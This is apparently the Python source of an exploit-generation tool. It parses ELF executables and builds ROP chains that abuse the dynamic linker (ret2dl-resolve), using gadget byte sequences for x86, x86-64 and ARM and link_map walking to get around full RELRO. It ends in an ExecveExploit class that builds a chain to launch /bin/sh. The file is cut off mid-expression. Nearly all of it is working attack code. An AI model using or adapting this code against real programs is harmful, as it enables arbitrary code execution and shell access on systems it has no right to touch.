#!/usr/bin/env python

import os
import sys
import json
import argparse
import operator
import struct

import elftools.elf.structs
from elftools.elf.elffile import ELFFile
from elftools.elf.relocation import RelocationSection
from elftools.elf.sections import SymbolTableSection
from elftools.elf.constants import P_FLAGS, SH_FLAGS
from elftools.elf.enums import ENUM_E_TYPE, ENUM_D_TAG

from rangeset import RangeSet

from utils import *
from memory import *

from collections import namedtuple

ElfN_Versym_size = 2
DF_BIND_NOW = 0x8
DF_1_NOW = 0x1

relocation_types = {
    "EM_386": 7,
    "EM_X86_64": 7,
    "EM_ARM": 22
}

# `ExploitInfo`
# * `prepare`: information on how to prepare the memory for the exploit
# * `reloc_index`: the index to pass to `dl_resolve`
# * `l_struct`: a *pointer* to a memory area containing a pointer to the `l`
#               structure used by the `dl_resolve`
# * `dl_resolve`: a *pointer* to a memory area containing a pointer to the
#                 `dl_resolve` function
# * `plt0`: the address of the first entry of the .plt which will call
#           `_dl_runtime_resolve`
ExploitInfo = namedtuple("ExploitInfo", ["prepare", "reloc_index", "l_struct",
                                         "dl_resolve", "plt0"])

class Exploit:
    __slots__ = "arch", "little", "pointer_size", "dynstr", "dynsym", \
                "relplt", "plt", "filler", "relocation_type", \
                "dynamic", "versym", "gadgets", "fini"

    def __init__(self):
        self.gadgets = {}
        self.empty_exploit = lambda: ""

    def allocate_helpers(self, buffer):
        return ""

    def add_gadget(self, architecture, name, info, gadget):
        """Adds a gadget to the collection of gadgets for the specified architecture."""
        if architecture not in self.gadgets:
            self.gadgets[architecture] = {}
        self.gadgets[architecture][name] = (info, gadget)

    def get_gadget(self, name):
        """Returns the gadget with the specified name for the current architecture"""
        return self.gadgets[self.arch][name]

    # TODO: split this, not everyone needs everything
    def config_from_elf(self, path):
        """Load all the necessary information about the program parsing the ELF
        headers. Furthermore, check some pre-requisites for the exploit to be
        successful."""
        executable_file = open(path, "r")
        elf = ELFFile(executable_file)
        get_section = lambda name: first_or_none(filter(lambda section: section.name == name, elf.iter_sections()))
        get_section_address = lambda section: None if (get_section(section) is None) else get_section(section).header.sh_addr

        # Checks
        if elf.header.e_type == ENUM_E_TYPE["ET_EXEC"]:
            raise Exception("Only non-PIE executables are supported")

        # Binary type
        self.arch = elf.header.e_machine
        self.little = elf.little_endian
        self.pointer_size = elf.elfclass / 8
        self.pointer_format = ("0x%." + str(self.pointer_size * 2) + "x")
        self.structs = elftools.elf.structs.ELFStructs(self.little, self.pointer_size * 8)

        # Useful sections
        self.sections = {section.name: (section.header.sh_addr, section.header.sh_addr + section.header.sh_size) for section in elf.iter_sections()}
        self.plt = get_section_address(".plt")
        self.got = get_section_address(".got")
        self.gotplt = get_section_address(".got.plt")

        # Dynamic section
        dynamic_section = get_section(".dynamic")
        self.writable_dynamic = dynamic_section.header.sh_flags & SH_FLAGS.SHF_WRITE
        self.dynamic = dynamic_section.header.sh_addr
        dynamic_entries = [self.structs.Elf_Dyn.parse(dynamic_entry)
                           for dynamic_entry in
                           chunks(dynamic_section.data(), self.structs.Elf_Dyn.sizeof())]

        # We try not to rely on section names
        get_dynamic = lambda name: first_or_none(map(lambda entry: entry.d_val, filter(lambda entry: entry.d_tag == name, dynamic_entries)))
        get_dynamic_index = lambda name: filter(lambda entry: entry[1].d_tag == name, enumerate(dynamic_entries))[0][0]
        self.dynstr = get_dynamic("DT_STRTAB")
        self.dynsym = get_dynamic("DT_SYMTAB")
        self.versym = get_dynamic("DT_VERSYM")
        self.verneed = get_dynamic("DT_VERNEED")
        self.relplt = get_dynamic("DT_JMPREL")
        self.addend = get_dynamic("DT_RELA") is not None
        self.dt_debug = self.dynamic + get_dynamic_index("DT_DEBUG") * self.structs.Elf_Dyn.sizeof() + self.pointer_size
        self.full_relro = (get_dynamic("DT_FLAGS") is not None) and \
                          ((get_dynamic("DT_FLAGS") & DF_BIND_NOW) != 0)
        self.full_relro = self.full_relro or ((get_dynamic("DT_FLAGS_1") is not None) and \
                          ((get_dynamic("DT_FLAGS_1") & DF_1_NOW) != 0))

        # Choose between Elf_Rel and Elf_Rela depending on the architecture
        self.rel_struct = self.structs.Elf_Rela if self.addend else self.structs.Elf_Rel

        # Looks like 64-bit and 32-bit have different alignment for the call to _dl_fixup
        self.reloc_alignment = 1 if self.pointer_size == 4 else self.rel_struct.sizeof()
        self.reloc_index_multiplier = self.rel_struct.sizeof() if self.pointer_size == 4 else 1

        #
        # Find candidate writeable areas
        #

        # Collect PT_LOAD segments (what gets mapped)
        loaded_segments = filter(lambda segment: segment.header.p_type == "PT_LOAD", elf.iter_segments())
        # Collect the segments which are writeable
        writeable_segments = filter(lambda segment: segment.header.p_flags & P_FLAGS.PF_W, loaded_segments)
        # Get their memory ranges (start, end)
        writeable_ranges = RangeSet.mutual_union(*map(lambda segment: (segment.header.p_vaddr, segment.header.p_vaddr + segment.header.p_memsz), writeable_segments))

        # List of sections we don't want to write to
        dont_overwrite_sections = filter_none([self.dynstr, self.dynsym, self.versym, self.relplt, self.dynamic, self.got, self.gotplt])
        # Memory ranges of the sections we don't want to write to
        dont_overwrite_ranges = RangeSet.mutual_union(*[self.sections[self.section_from_address(start)] for start in dont_overwrite_sections])

        # Handle RELRO segment, we don't want to write there
        relro_segment = first_or_none(filter(lambda segment: segment.header.p_type == "PT_GNU_RELRO", elf.iter_segments()))
        if relro_segment is not None:
            dont_overwrite_ranges = dont_overwrite_ranges | RangeSet(relro_segment.header.p_vaddr, relro_segment.header.p_vaddr + relro_segment.header.p_memsz)

        # Compute the set of candidate memory ranges
        self.writeable_ranges = writeable_ranges - dont_overwrite_ranges


        # Save the index of the DT_FINI entry
        fini = filter(lambda (i, entry): entry.d_tag == "DT_FINI", enumerate(dynamic_entries))
        if len(fini) > 0:
            self.fini = self.dynamic + self.structs.Elf_Dyn.sizeof() * fini[0][0]

        # Gadgets
        if self.gadgets.has_key(self.arch):
            executable_segments = filter(lambda segment: segment.header.p_flags  & P_FLAGS.PF_X, elf.iter_segments())

            for name, (info, gadget) in self.gadgets[self.arch].iteritems():
                location = find_string(executable_segments, hex_bytes(gadget))
                if location is None:
                    self.gadgets[self.arch][name] = None
                else:
                    self.gadgets[self.arch][name] = (info, gadget, self.ptr2str(location))

        # Find all '\x00\x00' in non-writeable segments
        self.non_writeable_segments = filter(lambda segment: not (segment.header.p_flags & P_FLAGS.PF_W), loaded_segments)
        self.zero_or_one_addresses = find_all_strings(self.non_writeable_segments, "\x00\x00") + \
                                     find_all_strings(self.non_writeable_segments, "\x01\x00" if self.little else "\x00\x01")

        self.filler = self.ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (self.pointer_size % 4)), 0))
        self.relocation_type = relocation_types[self.arch]

        #
        # Find the reloc pointing to the symbol whose name is the earliest in .dynstr
        #

        relplt_section = elf.get_section_by_name(self.section_from_address(self.relplt))
        dynsym_section = elf.get_section_by_name(self.section_from_address(self.dynsym))

        if not (isinstance(relplt_section, RelocationSection) and \
                isinstance(dynsym_section, SymbolTableSection)):
            raise Exception("Unexpect type for dynamic sections")

        # Grab .got.plt relocs symbol indexes
        symbol_indexes = [reloc.entry.r_info_sym if reloc.entry.r_info_type == self.relocation_type else None for reloc in relplt_section.iter_relocations()]
        # Get offsets in .dynstr
        names_offsets = [dynsym_section.get_symbol(index).entry.st_name if index is not None else None for index in symbol_indexes]
        # Filter out unamed offsets
        names_offsets = [offset if offset > 0 else None for offset in names_offsets]
        # Get the minimum value
        self.min_reloc_index, self.min_string_offset = min(enumerate(names_offsets), key=operator.itemgetter(1))
        self.min_symbol_index = symbol_indexes[self.min_reloc_index]
        log(str(self.min_reloc_index) + " " + str(self.min_symbol_index))

        log(self.dump())

    def get_non_writeable_segment(self, address):
        for non_writeable_segment in self.non_writeable_segments:
            start = non_writeable_segment.header.p_vaddr
            end = start + non_writeable_segment.header.p_memsz
            if (start <= address) and (address < end):
                return non_writeable_segment
        return None

    def read_non_writeable(self, address, size):
        segment = self.get_non_writeable_segment(address)
        if segment is None:
            raise Exception("Not a non-writeable address: " + hex(address))
        start = segment.header.p_vaddr
        end = start + segment.header.p_memsz
        return segment.data()[address - start:address - start + size]

    def section_from_address(self, address):
        for name, section in self.sections.iteritems():
            start = section[0]
            end = section[1]
            # TODO: we're excluding mappings at 0
            if (start > 0) and (start <= address) and ((address < end) or ((start > 0) and (end - start == 0))):
                return name
        raise Exception("Can't find a section for address " + hex(address))

    def closest_section_from_address(self, address):
        sorted_sections = [0] + sorted([section[0] for section in self.sections.itervalues()]) + [(1 << 8 * self.pointer_size) - 1]
        for start, end in pairwise(sorted_sections):
            if (start <= address) and (address < end):
                return ("0" if start == 0 else self.section_from_address(start)) + " + " + hex(address - start)
        raise Exception("Can't find a section for address " + hex(address))

    def dump(self):
        """Dump all the information held by this Exploit instance for debugging
        purposes."""
        return "\n".join([slot + ": " + str(getattr(self, slot)) for slot in self.__slots__])

    # Utility functions
    # =================

    def ptr2str(self, integer):
        """Convert a pointer (in the form of an integer) to a byte string of its memory
        representation according the current architecture endianness."""
        direction = "<" if self.little else ">"
        word_size = "Q" if self.pointer_size == 8 else "I"
        mask = (1 << self.pointer_size * 8) - 1
        return struct.pack(direction + word_size, integer & mask)

    def str2ptr(self, string):
        """Convert a byte string representing a pointer to an integer."""
        direction = "<" if self.little else ">"
        word_size = "Q" if self.pointer_size == 8 else "I"
        return struct.unpack(direction + word_size, string)[0]

    # Abstractions to write memory
    # ============================

    def write_string(self, memory_area, string):
        """Write an input string in the specified memory area invoking an appropriate
        number of times the do_writemem function."""
        string_len = len(string)
        if string_len > memory_area.size:
            raise Exception("You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, memory_area.size))

        result = self.empty_exploit()
        remaining = string
        while len(remaining) > 0:
            remaining, writer = self.do_writemem(self.ptr2str(memory_area.start + len(string) - len(remaining)), remaining)
            result += writer

        memory_area.content += string

        return result

    def write_pointer(self, memory_area, pointer):
        """Write a pointer (an integer) to a memory area."""
        return self.write_string(memory_area, self.ptr2str(pointer))

    def create_relocation(self, buffer, symbol_index, align_to=None):
        """Create an ElfN_Rel using a writable memory area as relocation
        target and referencing the requested symbol index."""

        reloc = buffer.allocate(self.rel_struct.sizeof(), align_to, self.reloc_alignment, name="reloc")

        relocation_target = buffer.allocate(self.pointer_size, name="relocation_target")

        # Create the Elf_Rela? structure to the exploit
        function_reloc = self.rel_struct.parse("\0" * self.rel_struct.sizeof())
        function_reloc.r_offset = relocation_target.start
        function_reloc.r_info_type = self.relocation_type
        function_reloc.r_info_sym = symbol_index

        if self.pointer_size * 8 == 32:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 8)
        else:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 32)

        prepare = self.write_string(reloc, self.rel_struct.build(function_reloc))

        return prepare, reloc

class CraftDlStructsExploit(Exploit):

    def jump_to(self, buffer, function_name):
        """Craft the necessary data structures (Elf_Rela?, Elf_Sym, version index) and
        strings to pass to the dynamic linker."""

        # Ensure the function name ends with a '\0'
        if not function_name.endswith("\0"):
            function_name += "\0"

        # Part of the ROP exploit to write the data structures
        exploit = self.empty_exploit()

        # Allocate the buffers necessary for the data structure we're going to
        # create
        function_name_str = buffer.allocate(len(function_name), self.dynstr, 1, name="function_name_str")

        # TODO: move symbol as first thing in the buffer
        if self.versym:
            to_range = lambda address, size: (address, address + size)

            # We have three possible constraints (in order of preference):
            # 1. The version index has special value 0 (local) or 1 (global)
            # 2. The version index falls in a memory area we can write
            # 3. The version index points to ElfN_Verneed structure we can write
            constraints = [lambda address, versym: (sys.stderr.write(hex(versym) + "\n") or 0) + versym in self.zero_or_one_addresses,
                           lambda address, versym: to_range(versym, ElfN_Versym_size) in buffer.ranges,
                           lambda address, versym: (self.get_non_writeable_segment(versym) is not None) and \
                                                   (to_range(self.verneed + self.structs.Elf_Verneed.sizeof() * self.str2ptr(self.read_non_writeable(versym, ElfN_Versym_size)), self.structs.Elf_Verneed.sizeof()) in buffer.ranges)]

            wrap_versym = lambda func: lambda address, index: func(address, self.versym + ElfN_Versym_size * index)
            constraints = map(wrap_versym, constraints)
        else:
            constraints = [lambda x,y: True]

        errors = 0
        for constraint in constraints:
            try:
                symbol = buffer.allocate(self.structs.Elf_Sym.sizeof(), self.dynsym, name="symbol", constraint=constraint)
                break
            except AllocateFailException:
                errors += 1
                pass

        if self.versym:
            if errors > 2: # We failed
                raise Exception("Can't find a position for the Elf_Sym")
            versym_address = self.versym + ElfN_Versym_size * symbol.index
            if errors == 1: # We can write in ElfN_Versym
                versym_area = buffer.allocate(ElfN_Versym_size, align_to=self.versym, start=versym_address)
                exploit += self.write_string(versym_area, "\x00\x00")
            elif errors == 2: # We can write in ElfN_Verneed
                verneed_address = self.verneed + self.structs.Elf_Verneed.sizeof() * self.str2ptr(self.read_non_writeable(versym_address, ElfN_Versym_size))
                verneed_area = buffer.allocate(self.structs.Elf_Verneed.sizeof(), align_to=self.verneed, start=verneed_address)

                verneed_struct = self.structs.Elf_Verneed.parse("\0" * self.structs.Elf_Verneed.sizeof())
                verneed_struct.vn_version = 1;
                verneed_struct.vn_cnt = 0;
                verneed_struct.vn_file = 0;
                verneed_struct.vn_aux = 0;
                verneed_struct.vn_next = 0;
                exploit += self.write_string(verneed_area, self.structs.Elf_Verneed.build(verneed_struct))

        # TODO: merge consecutive string writes for possible optimizations
        # Append the creation of the function name string to the exploit
        exploit += self.write_string(function_name_str, function_name)

        # Append the creation of the Elf_Sym structure to the exploit
        function_symbol = self.structs.Elf_Sym.parse("\0" * self.structs.Elf_Sym.sizeof())
        function_symbol.st_name = function_name_str.index
        function_symbol.st_info.bind = "STB_GLOBAL"
        function_symbol.st_info.type = "STT_FUNC"

        exploit += self.write_string(symbol, self.structs.Elf_Sym.build(function_symbol))

        prepare_relocation, reloc = self.create_relocation(buffer, symbol.index, align_to=self.relplt)
        exploit += prepare_relocation

        return ExploitInfo(prepare=exploit, reloc_index=reloc.index, plt0=self.plt, l_struct=None, dl_resolve=None)

class RawDumperExploit(Exploit):
    def __init__(self):
        Exploit.__init__(self)
        self.empty_exploit = lambda: []

    def do_writemem(self, address, value):
        """Write a pointer-sized buffer to the specfied location."""
        return "", [("write_constant", value, address, None)]

    def write_with_offset(self, pointer_address, offset, value):
        return [("write_with_offset", value, pointer_address, offset)]

    def deref_with_offset_and_save(self, pointer_address, offset, save_address):
        return [("deref_with_offset_and_save", save_address, pointer_address, offset)]

class CommonGadgetsExploit(Exploit):
    """Mainly add a pool of gadgets common in the various architectures."""

    def __init__(self):
        Exploit.__init__(self)

        # Good for FreeBSD

        # self.add_gadget("EM_386", "writemem", 4,
        #                 " 8b 44 24 08" + # mov    eax,DWORD PTR [esp+0x8] \
        #                 " 8b 4c 24 04" + # mov    ecx,DWORD PTR [esp+0x4] \
        #                 " 89 01" +       # mov    DWORD PTR [ecx],eax \
        #                 " c3")           # ret

        # self.add_gadget("EM_386", "cleanup", 3,
        #                 " 83 c4 0c" + # add    esp,0xc \
        #                 " c3")        # ret

        # Good for Linux

        self.add_gadget("EM_386", "writemem", 4,
                        " 8b 54 24 08" + # mov edx,DWORD PTR [esp+0x8] \
                        " 8b 44 24 04" + # mov eax,DWORD PTR [esp+0x4] \
                        " 89 10"       + # mov DWORD PTR [eax],edx \
                        " c3")           # ret

        self.add_gadget("EM_386", "deref_write_with_offset", 4,
                        " 58"       + # pop eax \
                        " 5b"       + # pop ebx \
                        " 59"       + # pop ecx \
                        " 8b 00"    + # mov eax,DWORD PTR [eax] \
                        " 89 1c 08" + # mov DWORD PTR [eax+ecx*1],ebx \
                        " c3")        # ret

        self.add_gadget("EM_386", "deref_with_offset_and_save", 4,
                        " 58"       + # pop eax \
                        " 5b"       + # pop ebx \
                        " 59"       + # pop ecx \
                        " 8b 00"    + # mov eax,DWORD PTR [eax]
                        " 8b 04 18" + # mov eax,DWORD PTR [eax+ebx*1] \
                        " 89 01"    + # mov DWORD PTR [ecx],eax \
                        " c3")        # ret

        self.add_gadget("EM_386", "copy_to_stack", 4,
                        " 5b"       + # pop ebx \
                        " 59"       + # pop ecx \
                        " 8b 1b"    + # mov ebx,DWORD PTR [ebx] \
                        " 89 1c 0c" + # mov DWORD PTR [esp+ecx*1],ebx \
                        " c3")        # ret

        self.add_gadget("EM_386", "cleanup", 4,
                        " 5b" + # pop ebx \
                        " 5e" + # pop esi \
                        " 5f" + # pop edi \
                        " 5d" + # pop ebp \
                        " c3")  # ret

        # This gadget requires 6 useless parameters

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 8b 54 24 10" + # mov rdx,QWORD PTR [rsp+0x10] \
                        " 48 8b 44 24 08" + # mov rax,QWORD PTR [rsp+0x8] \
                        " 48 89 10"       + # mov QWORD PTR [rax],rdx \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 89 37"       + # mov    QWORD PTR [rdi],rsi \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "cleanup", 6,
                        " 5b"    + # pop    rbx \
                        " 5d"    + # pop    rbp \
                        " 41 5c" + # pop    r12 \
                        " 41 5d" + # pop    r13 \
                        " 41 5e" + # pop    r14 \
                        " 41 5f" + # pop    r15 \
                        " c3")     # ret

        self.add_gadget("EM_X86_64", "args", None,
                        " 4c 89 ea" +   # mov    rdx,r13 \
                        " 4c 89 f6" +   # mov    rsi,r14 \
                        " 44 89 ff" +   # mov    edi,r15d \
                        " 41 ff 14 dc") # call   QWORD PTR [r12+rbx*8]

        # Assume LE

        self.add_gadget("EM_ARM", "writemem", 4,
                        " 00 10 80 e5" + # str r1, [r0] \
                        " 1e ff 2f e1")  # bx lr

        # Better not use this due to a bug in QEMU

        #self.add_gadget("EM_ARM", "prepare_regs", None,
        #                " f8 85 bd e8")  # pop {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "prepare_regs", None,
                        " f8 85 bd 08")  # popeq {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "setup_args", None,
                        " 07 00 a0 e1" + # mov r0, r7 \
                        " 08 10 a0 e1" + # mov r1, r8 \
                        " 0a 20 a0 e1" + # mov r2, sl \
                        " 01 40 84 e2" + # add r4, r4, #1 \
                        " 33 ff 2f e1" + # blx r3 \
                        " 06 00 54 e1" + # cmp r4, r6 \
                        " f7 ff ff 1a" + # bne 8604 <__libc_csu_init+0x38> \
                        " f8 85 bd e8")  # pop {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "just_ret", None,
                        " 1e ff 2f e1")  # bx      lr

    def allocate_helpers(self, buffer):
        """Allocate helper buffers needed by some specific platforms (e.g. for cleanup
        purposes)"""
        result = Exploit.allocate_helpers(self, buffer)
        if self.arch == "EM_X86_64":
            self.popret = buffer.allocate(self.pointer_size, name="popret")
            nope, nope, cleanup_location = self.get_gadget("cleanup")
            result += self.write_pointer(self.popret, self.str2ptr(cleanup_location) + 8)
        return result

    def deref_with_offset_and_save(self, pointer_address, offset, save_address):
        """Dereference the address in the given memory area (pointer_address),
        add the offset, and copy the content to the given address
        (save_address)."""
        none, none, location = self.get_gadget("deref_with_offset_and_save")
        return location + pointer_address + offset + save_address

    def write_with_offset(self, pointer_address, offset, value):
        """Dereference the address in the vigne memory area, add the specified
        offset and write there the specified value."""
        none, none, location = self.get_gadget("deref_write_with_offset")
        return location + pointer_address + value + offset

    def copy_to_stack(self, offset, source):
        """Copy the content of the given memory area (source) at the specified
        offset from the stack pointer. When computing the offset assume the
        following layout (assuming 32-bit pointers):

        ...
        &gadget              -12
        offset                -8
        &source               -4
        &next_return_address   0
        parameter1            +4
        ...
        """
        none, none, location = self.get_gadget("copy_to_stack")
        return location + offset + source

    def call(self, invocation, parameters):
        """ROP function invocation: return a ROP chain that sets up the arguments on the
        stack and/or on the registers, invoke the function and cleanup the
        arguments."""
        if self.arch == "EM_386":
            return self.call32(invocation, parameters)
        elif self.arch == "EM_X86_64":
            return self.call64(invocation, parameters)
        elif self.arch == "EM_ARM":
            return self.call_arm(invocation, parameters)
        else:
            raise Exception("Unsupported architecture")

    def call32(self, invocation, parameters):
        """Implements the i386 calling convention."""
        cleanup_size, nope, cleanup_location = self.get_gadget("cleanup")
        if len(parameters) > cleanup_size:
            raise Exception("Too many parameters, find a better gadget")

        prepare = invocation
        stack_frame = cleanup_location + \
                      "".join(map(str, parameters)) + \
                      self.filler * (cleanup_size - len(parameters))
        return prepare, 0, stack_frame

    def call64(self, invocation, parameters):
        """Implements the x86_64 calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters")
        elif self.str2ptr(parameters[0]) & 0xffffffff00000000 != 0:
            raise Exception("First parameters high part has to be 0")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, args_location = self.get_gadget("args")
        nope, nope, cleanup_location = self.get_gadget("cleanup")
        prepare = cleanup_location
        prepare += self.ptr2str(0) # rbx
        prepare += self.ptr2str(1) # rbp == rbx + 1
        prepare += self.ptr2str(self.fini + 8) # r12, jump to pop;ret
        prepare += parameters[2] # r13 -> rdx
        prepare += parameters[1] # r14 -> rsi
        prepare += parameters[0] # r15 -> edi
        prepare += args_location # move registers; call pop;ret
        prepare += self.filler * 7
        prepare += invocation

        return prepare, len(prepare) - len(invocation), ""

    def call_arm(self, invocation, parameters):
        """Implements the ARM calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters, find a better gadget")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, prepare_regs_location = self.get_gadget("prepare_regs")
        nope, nope, setup_args_location = self.get_gadget("setup_args")
        prepare = prepare_regs_location
        prepare += invocation[0:4] # r3, target of a blx
        prepare += self.ptr2str(0) # r4
        prepare += self.filler # r5
        prepare += self.ptr2str(1) # r6 == r4 + 1
        prepare += parameters[0] # r7 -> r0
        prepare += parameters[1] # r8 -> r1
        prepare += parameters[2] # sl -> r2
        prepare += setup_args_location # pc
        prepare += self.filler * 7 # pop again 7 regs + pc

        return prepare, len(prepare_regs_location), ""

    def do_writemem(self, address, value):
        """Write a pointer-sized buffer to the specfied location. This
        function uses the writemem gadget."""
        write_size, nope, location = self.get_gadget("writemem")

        remaining = ""
        if len(value) > write_size:
            remaining = value[write_size:]
            value = value[0:write_size]
        elif len(value) < write_size:
            value = value.ljust(write_size, "\0")

        # TODO: using kill for this is overkill, create a simpler gadget
        prepare, nope, stack_frame = self.call(location, [address, value])
        return remaining, prepare + stack_frame

class CorruptLdSoExploit(Exploit):

    def jump_to(self, buffer, function_name):

        # Ensure the function name ends with a '\0'
        if not function_name.endswith("\0"):
            function_name += "\0"

        dt_strtab_offset = ENUM_D_TAG["DT_STRTAB"] * self.pointer_size
        l_info_offset = 8 * self.pointer_size

        fake_dynstr_area = buffer.allocate(self.min_string_offset, name="fake_dynstr")
        function_name_area = buffer.allocate(len(function_name), fake_dynstr_area.start, 1, name="function_name")

        # TODO: instead of this support for "don't care" memory areas
        # Allocate the DT_STRTAB dynamic entry (possibly in the fake .dynstr itself, if it fits)
        if fake_dynstr_area.size >= self.structs.Elf_Dyn.sizeof():
            dt_strtab_entry_area = fake_dynstr_area
        else:
            dt_strtab_entry_area = buffer.allocate(self.structs.Elf_Dyn.sizeof(), name="dt_strtab_entry")

        exploit = self.empty_exploit()

        exploit += self.write_string(function_name_area, function_name)

        # TODO: here is not really necessary to write DT_STRTAB, no one will check that
        dt_strtab_entry = self.structs.Elf_Dyn.parse("\x00" * self.structs.Elf_Dyn.sizeof())
        dt_strtab_entry.d_tag = "DT_STRTAB"
        dt_strtab_entry.d_val = fake_dynstr_area.start
        exploit += self.write_string(dt_strtab_entry_area, self.structs.Elf_Dyn.build(dt_strtab_entry))

        if not self.full_relro:
            # OK, the l_pointer is just a GOT[1] and dl_resolve is in GOT[2]
            l_pointer = self.gotplt + self.pointer_size * 1
            dl_resolve_pointer = self.gotplt + self.pointer_size * 2

            # We can also use the plt[0] entry
            plt0 = self.plt
            reloc_index = self.min_reloc_index * self.rel_struct.sizeof()
        else:
            # We can't use GOT[1], GOT[2] or plt[0], let's work around this

            # We reuse a part of the buffer multiple times
            exe_link_map_area = buffer.allocate(self.pointer_size, name="exe_link_map")
            first_lib_link_map_area = buffer.allocate(self.pointer_size, name="first_lib_link_map")
            dyn_gotplt_area = first_lib_link_map_area # Reuse
            gotplt_area = dyn_gotplt_area # Reuse
            dl_resolve_area = gotplt_area # Reuse

            # Prepare fake relocation
            prepare_relocation, fake_relocation_area = self.create_relocation(buffer, self.min_symbol_index)
            exploit += prepare_relocation

            # TODO: factorize this
            dt_jmprel_entry_area = buffer.allocate(self.structs.Elf_Dyn.sizeof(), name="fake_jmprel_entry")
            # TODO: here is not really necessary to write DT_JMPREL, no one will check that
            dt_jmprel_entry = self.structs.Elf_Dyn.parse("\x00" * self.structs.Elf_Dyn.sizeof())
            dt_jmprel_entry.d_tag = "DT_JMPREL"
            dt_jmprel_entry.d_val = fake_relocation_area.start
            exploit += self.write_string(dt_jmprel_entry_area, self.structs.Elf_Dyn.build(dt_jmprel_entry))

            # Let's navigate a bit through data structures

            # exe_link_map = *(*DT_DEBUG.d_val + offsetof(r_map))
            # TODO: factorize out glibc's magic numbers
            r_map_offset = 4 # an int
            exploit += self.deref_with_offset_and_save(self.ptr2str(self.dt_debug),
                                                       self.ptr2str(r_map_offset),
                                                       self.ptr2str(exe_link_map_area.start))

            # first_lib_link_map = *(*exe_link_map + offsetof(l_next))
            l_next_offset = self.pointer_size * 3 # skip l_addr, l_name and l_ld
            exploit += self.deref_with_offset_and_save(self.ptr2str(exe_link_map_area.start),
                                                       self.ptr2str(l_next_offset),
                                                       self.ptr2str(first_lib_link_map_area.start))

            # Repeat until we reach the desired library (check with `ldd`)
            for _ in xrange(1, self.library_index + 1):
                exploit += self.deref_with_offset_and_save(self.ptr2str(first_lib_link_map_area.start),
                                                           self.ptr2str(l_next_offset),
                                                           self.ptr2str(first_lib_link_map_area.start))

            # dyn_gotplt = *(*first_lib_link_map + offsetof(l_info) + offsetof(DT_PLTGOT))
            dt_pltgot_offset = ENUM_D_TAG["DT_PLTGOT"] * self.pointer_size
            exploit += self.deref_with_offset_and_save(self.ptr2str(first_lib_link_map_area.start),
                                                       self.ptr2str(l_info_offset + dt_pltgot_offset),
                                                       self.ptr2str(dyn_gotplt_area.start))

            # gotplt = *(*dyn_gotplt + offsetof(d_val))
            d_val_offset = self.pointer_size
            exploit += self.deref_with_offset_and_save(self.ptr2str(dyn_gotplt_area.start),
                                                       self.ptr2str(d_val_offset),
                                                       self.ptr2str(gotplt_area.start))

            # dl_resolve = *(*gotplt + offsetof(dl_resolve_offset))
            dl_resolve_offset = self.pointer_size * 2 # Take GOT[2]
            exploit += self.deref_with_offset_and_save(self.ptr2str(gotplt_area.start),
                                                       self.ptr2str(dl_resolve_offset),
                                                       self.ptr2str(dl_resolve_area.start))

            # Make DT_JMPREL of the main executable point to our fake relocation
            # *(*exe_link_map + offsetof(l_info) + offsetof(DT_REL)) = fake_relocation
            dt_rel_offset = ENUM_D_TAG["DT_JMPREL"] * self.pointer_size
            exploit += self.write_with_offset(self.ptr2str(exe_link_map_area.start),
                                              self.ptr2str(l_info_offset + dt_rel_offset),
                                              self.ptr2str(dt_jmprel_entry_area.start))

            l_pointer = exe_link_map_area.start
            dl_resolve_pointer = dl_resolve_area.start
            plt0 = None
            reloc_index = 0

        # Make DT_STRTAB point to our fake DT_STRTAB structure
        # *(*l_pointer + offsetof(l_info) + offsetof(DT_STRTAB)) = dt_strtab_entry
        exploit += self.write_with_offset(self.ptr2str(l_pointer),
                                          self.ptr2str(l_info_offset + dt_strtab_offset),
                                          self.ptr2str(dt_strtab_entry_area.start))

        return ExploitInfo(prepare=exploit,
                           reloc_index=reloc_index,
                           l_struct=l_pointer,
                           dl_resolve=dl_resolve_pointer,
                           plt0=plt0)

class ExecveExploit(CommonGadgetsExploit):

    def launch(self, program):
        """Launch an execve("/bin/sh/", &null, &null); exploit."""

        buffer = Buffer(self, self.writeable_ranges)

        binsh_str = program + "\0"

        pointer_to_null = buffer.allocate(self.pointer_size, name="pointer_to_null")
        binsh = buffer.allocate(len(binsh_str), name="binsh")

        exploit = ""

        exploit += self.allocate_helpers(buffer)

        # Pointer to NULL
        exploit += self.write_pointer(pointer_to_null, 0)

        # /bin/sh
        exploit += self.write_string(binsh, binsh_str)

        exploit_info = self.jump_to(buffer, "execve")

        exploit += exploit_info.prepare

        if exploit_info.plt0 is not None:
            # Invocation of the dynamic linker resolver (plt[0]) with the
            # appropriate relocation index
            launch = self.ptr2str(exploit_info.plt0) + self.ptr2str(exploit_info.reloc_index)

            prepare, nope, stack_frame = self.call(launch, [binsh.pointer, pointer_to_null.pointer, pointer_to_null.pointer])
            exploit += prepare + stack_frame

        elif (exploit_info.dl_resolve is not None) and \
             (exploit_info.l_struct is not None):

            # TODO: this is outdated
            # Layout:
            #    &copy_to_stack
            #    offset = C - A
            #    destination
            # A: &copy_to_stack
            #    offset = B - B
            #    destination
            # B: &dl_resolve
            # C: &l
            #    reloc_index


            function_call, next_gadget_offset, stack_frame = self.call(self.filler, [binsh.pointer, pointer_to_null.pointer, pointer_to_null.pointer])

            copy_dl_resolve = self.copy_to_stack(self.ptr2str(exploit_info.dl_resolve),
                                                 self.ptr2str(next_gadget_offset + 0 * self.pointer_size))

            exploit += self.copy_to_stack(self.ptr2str(exploit_info.l_struct),
                                          self.ptr2str(len(copy_dl_resolve) + len(function_call))) + \
                     copy_dl_resolve + \
                     function_call + \
                     self.filler + \
